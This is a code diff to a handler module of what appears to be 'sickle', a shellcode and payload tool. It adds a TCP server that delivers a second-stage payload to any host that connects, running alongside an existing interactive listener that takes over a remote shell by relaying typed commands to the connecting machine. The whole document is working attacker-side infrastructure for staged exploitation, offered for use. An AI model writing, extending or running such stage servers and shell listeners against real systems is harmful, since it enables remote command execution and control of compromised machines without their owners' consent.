@@ -1,17 +1,25 @@
 import os
 import sys
 import time
+import threading
 import socketserver
 
 from sickle.common.lib.generic import modparser
 
 time_start = time.time()
 
+class TCPStageHandler(socketserver.StreamRequestHandler):
+
+    def handle(self):
+
+        log_print(f"Sending stage ({len(self.server.stage)}) to {self.client_address[0]}")
+        self.request.sendall(self.server.stage)
+
 class SimpleTTYHandler(socketserver.StreamRequestHandler):
 
     def handle(self):
 
-        log_print(f"Received connection from {self.client_address[0]}\n")
+        log_print(f"Connection established with {self.client_address[0]}\n")
 
         while True:
             self.request.settimeout(0.1)
@@ -30,6 +38,8 @@ class SimpleTTYHandler(socketserver.StreamRequestHandler):
             shell_prompt = response.decode('latin-1')
 
             self.request.sendall(input(shell_prompt).encode('latin-1') + b'\n')
+
+
 
 class Module():
 
@@ -68,10 +78,14 @@ class Module():
     arguments["SRVPORT"]["optional"] = "yes"
     arguments["SRVPORT"]["description"] = "Port to bind handler to"
 
+    arguments["STGPORT"] = {}
+    arguments["STGPORT"]["optional"] = "yes"
+    arguments["STGPORT"]["description"] = "Port that obtains connection to sends a second stage"
+
     def __init__(self, arg_object):
        
         self.arg_list  = arg_object["positional arguments"]
-        self.shellcode = arg_object["raw bytes"]
+        self.stage     = arg_object["raw bytes"]
 
         self.set_args()
 
@@ -91,9 +105,13 @@ class Module():
         if "SRVPORT" not in argv_dict.keys():
             self.srvport = 4242
         else:
-            self.srvport = argv_dict["SRVPORT"]
+            self.srvport = int(argv_dict["SRVPORT"])
+
+        if "STGPORT" in argv_dict.keys():
+            self.stgport = int(argv_dict["STGPORT"])
 
     def do_thing(self):
+
         if self.handler == "tty":
             self.start_tty_handler()
         else:
@@ -102,10 +120,19 @@ class Module():
 
     def start_tty_handler(self):
 
-        self.start = time.time()
-        with socketserver.TCPServer(("0.0.0.0", 4242), SimpleTTYHandler) as handler:
-            log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
-            handler.serve_forever()
+        if self.stage != None:
+            stage_server = socketserver.TCPServer((self.srvhost, self.stgport), TCPStageHandler)
+            stage_server.stage = self.stage
+
+            server_thread = threading.Thread(target=stage_server.serve_forever)
+            server_thread.daemon = True
+            server_thread.start()
+
+            log_print(f"TCPStageHandler started on port {self.srvhost}:{self.stgport}")
+
+        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
+        server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
+        server.serve_forever()
 
 def log_print(msg):
         
